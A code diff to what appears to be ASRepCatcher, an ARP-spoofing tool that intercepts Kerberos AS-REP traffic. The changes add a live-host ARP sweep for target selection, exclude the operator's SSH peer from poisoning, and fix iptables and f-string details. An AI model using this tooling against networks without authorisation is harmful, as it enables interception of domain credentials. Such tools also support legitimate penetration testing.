@@ -279,7 +279,7 @@ if ip_forward != '1' :
     logging.debug('[*] Enabled IPV4 forwarding')
 
 if parameters.mode == 'listen':
-    os.system('''sudo iptables -P FORWARD ACCEPT''')
+    os.system('iptables -P FORWARD ACCEPT')
 
 
 
@@ -306,9 +306,15 @@ if not disable_spoofing :
             sys.exit(1)
         TargetsList = iplist.split(',')
     else :
-        TargetsList = [str(ip) for ip in iface_subnet.hosts()]
-        TargetsList.remove(gw)
-        logging.info(f'[*] Targets not supplied, will use local subnet {iface_subnet} minus the gateway')
+        logging.info(f'[*] Targets not supplied, discovering live hosts on {iface_subnet}...')
+        # Start with all hosts, but we will prune to only live ones
+        provisional_targets = [str(ip) for ip in iface_subnet.hosts() if str(ip) != gw]
+        # ARP sweep to find who is actually up
+        live_mac = get_mac_addresses(provisional_targets + [gw])
+        live_hosts = [ip for ip in provisional_targets if ip in live_mac]
+        TargetsList = live_hosts
+        logging.info(f'[*] Using only live hosts ({len(TargetsList)} found), gateway excluded')
+
 
     if gw in TargetsList and (parameters.t is not None or parameters.tf is not None) :
         logging.info('[*] Found gateway in targets list. Removing it')
@@ -322,6 +328,19 @@ if not disable_spoofing :
     if parameters.t is not None or parameters.tf is not None :
         logging.debug('[*] Checking targets list...')
         ip_addresses_not_in_iface_subnet = [ip for ip in set(TargetsList) if ipaddress.ip_address(ip) not in ipaddress.ip_network(iface_subnet)]
+     # auto-exclude current SSH peer(s) so we don't nuke our own session
+    try:
+        ssh_peers = []
+        if 'SSH_CLIENT' in os.environ and os.environ['SSH_CLIENT']:
+            ssh_peers.append(os.environ['SSH_CLIENT'].split()[0])
+        if 'SSH_CONNECTION' in os.environ and os.environ['SSH_CONNECTION']:
+            ssh_peers.append(os.environ['SSH_CONNECTION'].split()[0])
+        for peer in set(ssh_peers):
+            if peer in TargetsList:
+                TargetsList.remove(peer)
+                logging.info(f'[*] Excluding SSH peer from poisoning: {peer}')
+    except Exception as _e:
+        logging.debug(f'[*] Could not parse SSH peer for exclusion: {_e}')
     if len(ip_addresses_not_in_iface_subnet) > 0 :
         logging.debug(f'[-] These IP addresses are not in {iface} subnet and will be removed from targets list : {ip_addresses_not_in_iface_subnet}')
         logging.warning('[!] Some IP addresses were removed from the targets list. Run in debug mode for more details.')
@@ -462,7 +481,7 @@ def listen_mode():
         os.system("iptables-restore < /tmp/asrepcatcher_rules.v4")
         logging.info("[*] Restored iptables")
         if ip_forward != '1' :
-            os.system("echo {ip_forward} > /proc/sys/net/ipv4/ip_forward")
+            os.system(f"echo {ip_forward} > /proc/sys/net/ipv4/ip_forward")
             logging.info('[*] Restored IPV4 forwarding value')
         AllUsernames.update(UsernamesSeen.union(UsernamesCaptured))
         if AllUsernames != set() :
@@ -676,7 +695,7 @@ def relay_mode() :
         os.system("iptables-restore < /tmp/asrepcatcher_rules.v4")
         logging.info("[*] Restored iptables")
         if ip_forward != '1' :
-            os.system("echo {ip_forward} > /proc/sys/net/ipv4/ip_forward")
+            os.system(f"echo {ip_forward} > /proc/sys/net/ipv4/ip_forward")
             logging.info('[*] Restored IPV4 forwarding value')
         AllUsernames.update(UsernamesSeen.union(UsernamesCaptured))
         if AllUsernames != set() :
